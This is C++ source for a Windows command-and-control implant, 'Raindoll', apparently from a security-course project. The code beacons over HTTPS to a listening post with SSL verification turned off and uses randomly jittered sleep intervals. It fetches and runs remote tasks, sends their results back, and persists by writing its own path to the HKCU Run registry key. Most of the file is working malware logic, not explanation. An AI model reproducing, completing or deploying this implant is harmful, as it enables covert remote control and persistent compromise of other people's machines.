#ifdef _WIN32
#define WIN32_LEAN_AND_MEAN
#endif // _WIN32

#include "implant.h"
#include "tasks.h"

#include <windows.h>
#include <string>
#include <cstring>
#include <string_view>
#include <iostream>
#include <chrono>
#include <algorithm>

#include <boost/uuid/uuid_io.hpp>
#include <boost/property_tree/json_parser.hpp>
#include <boost/property_tree/ptree.hpp>

#include <cpr/cpr.h>

#include <nlohmann/json.hpp>

using json = nlohmann::json;

// Function to send an asynchronous HTTPS POST request with a payload to the listening post
[[nodiscard]] std::string sendHttpsRequest(std::string_view host,
                                           std::string_view port,
                                           std::string_view uri,
                                           std::string_view payload)
{
    auto const serverAddress = host;
    auto const serverPort = port;
    auto const serverUri = uri;
    auto const httpVersion = 11;
    auto const requestBody = json::parse(payload);

    // Construct our listening post endpoint URL from user args, only HTTP to start
    std::stringstream ss;
    ss << "https://" << serverAddress << ":" << serverPort << serverUri;
    std::string fullServerUrl = ss.str();

    // Make an asynchronous HTTP post request to the listening post
    cpr::AsyncResponse asyncRequest = cpr::PostAsync(cpr::Url{fullServerUrl},
                                                     cpr::Body{requestBody.dump()},
                                                     cpr::Header{{"Content-Type", "application/json"}},
                                                     cpr::VerifySsl(false));
    cpr::Response response = asyncRequest.get();

    std::cout << "Request body: " << requestBody << std::endl;
    return response.text;
};

// Method to enable/disable the running status on our implant
void Implant::setRunning(bool isRunningIn) { isRunning = isRunningIn; }

// Method to set the mean dwell time on our implant
// It will tells the implants how often it should contact the listening post
// It's generally not a good idea to have a consistent dwell time
void Implant::setMeanDwell(double meanDwell)
{
    // exponential_distribution allows random jitter generation
    dwellDistributionSeconds = std::exponential_distribution<double>(1. / meanDwell);
}

// Method to send task results and receive new tasks
[[nodiscard]] std::string Implant::sendResults()
{
    // Local results variable
    boost::property_tree::ptree resultsLocal;
    // A scoped lock to perform a swap
    // It is necessary because we're doing things asynchronously and we want to ensure
    // that we're not stepping on another thread's toe while we swap to get the task results
    {
        std::scoped_lock<std::mutex> resultsLock{resultsMutex};
        resultsLocal.swap(results);
    }
    // Format result contents
    std::stringstream resultsStringStream;
    boost::property_tree::write_json(resultsStringStream, resultsLocal);
    // Contact listening post with results and return any tasks received
    return sendHttpsRequest(host, port, uri, resultsStringStream.str());
}

// Method to parse tasks received from listening post
void Implant::parseTasks(const std::string &response)
{
    // Local response variable
    std::stringstream responseStringStream{response}; // Variable to hold the response with the tasks we got from the listening device

    // Read response from listening post as JSON
    boost::property_tree::ptree tasksPropTree;
    boost::property_tree::read_json(responseStringStream, tasksPropTree);

    // Range based for-loop to parse tasks and push them into the tasks vector
    // Once this is done, the tasks are ready to be serviced by the implant
    for (const auto &[taskTreeKey, taskTreeValue] : tasksPropTree)
    {
        // A scoped lock to push into vector, push the task tree and setter for the configuration task
        {
            tasks.push_back(
                parseTaskFrom(taskTreeValue, [this](const auto &configuration)
                              {
					setMeanDwell(configuration.meanDwell); // Call the setter function "setMeanDwell" for the implant configuration
					setRunning(configuration.isRunning); }) // Call the setter function "setRunning" for the implant configuration
            );                     // Create a vector Tasks containing the key-value pair from the response
        }
    }
}

// Loop and go through the tasks received from the listening post, then service them
void Implant::serviceTasks()
{
    while (isRunning)
    { // While-loop based on the status of the boolean "isRunning" flag that's set in our implant configuration object
        // Local tasks variable
        std::vector<Task> localTasks;
        // Scoped lock to perform a swap
        {
            std::scoped_lock<std::mutex> taskLock{taskMutex};
            tasks.swap(localTasks);
        }
        // Range based for-loop to call the run() method on each task and add the results of tasks
        for (const auto &task : localTasks)
        {
            // Call run() on each task and we(ll get back values for id, contents, and success
            const auto [id, contents, success] = std::visit([](const auto &task)
                                                            { return task.run(); },
                                                            task);
            // Scoped lock to add task results
            {
                std::scoped_lock<std::mutex> resultsLock{resultsMutex};
                results.add(boost::uuids::to_string(id) + ".contents", contents);
                results.add(boost::uuids::to_string(id) + ".success", success);
            }
        }
        // Go to sleep
        std::this_thread::sleep_for(std::chrono::seconds{1});
    }
}

// Method to start beaconing to the listening post
void Implant::beacon()
{
    while (isRunning)
    {
        // Try to contact the listening post and send results/get back tasks
        // Then, if tasks were received, parse and store them for execution
        // Tasks stored will be serviced by the task thread asynchronously
        try
        {
            std::cout << "Raindoll is sending results to listening post...\n"
                      << std::endl;
            const auto serverResponse = sendResults();
            std::cout << "\nListening post response content: " << serverResponse << std::endl;
            std::cout << "\nParsing tasks received..." << std::endl;
            parseTasks(serverResponse);
            std::cout << "\n================================================\n"
                      << std::endl;
        }
        catch (const std::exception &e)
        {
            printf("\nBeaconing error: %s\n", e.what());
        }
        // Sleep for a set duration with jitter and beacon again later
        const auto sleepTimeDouble = dwellDistributionSeconds(device);
        const auto sleepTimeChrono = std::chrono::seconds{static_cast<unsigned long long>(sleepTimeDouble)};
        std::this_thread::sleep_for(sleepTimeChrono);
    }
}

// TODO method to add persistence
void Implant::persist()
{
    // persister le prg
    // v�rifier ce qu'il se passe quand on persiste le programme et qu'on red�marre plusieurs fois
    // persister
    char buffer[MAX_PATH] = {0};

    HKEY hkey = NULL;

    GetModuleFileNameA(NULL, buffer, MAX_PATH);

    std::cout << buffer << std::endl;

    LONG res = RegOpenKeyExA(HKEY_CURRENT_USER, (LPCSTR) "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hkey);

    if (res == ERROR_SUCCESS)
    {
        // create new registry key
        RegSetValueExA(hkey,
                       (LPCSTR) "T-SEC-902-PAR_7",
                       0,
                       REG_SZ,
                       (unsigned char *)buffer,
                       (DWORD)strlen(buffer));
        RegCloseKey(hkey);
    }
    // return 0;
}

// Initialize variables for our object
Implant::Implant(std::string host, std::string port, std::string uri) : // Listening post endpoint URL arguments
                                                                        host{std::move(host)},
                                                                        port{std::move(port)},
                                                                        uri{std::move(uri)},
                                                                        // Options for configuration settings
                                                                        isRunning{true},
                                                                        dwellDistributionSeconds{1.},
                                                                        // Thread that runs all our tasks, performs asynchronous I/O
                                                                        taskThread{std::async(std::launch::async, [this]
                                                                                              { serviceTasks(); })}
{
}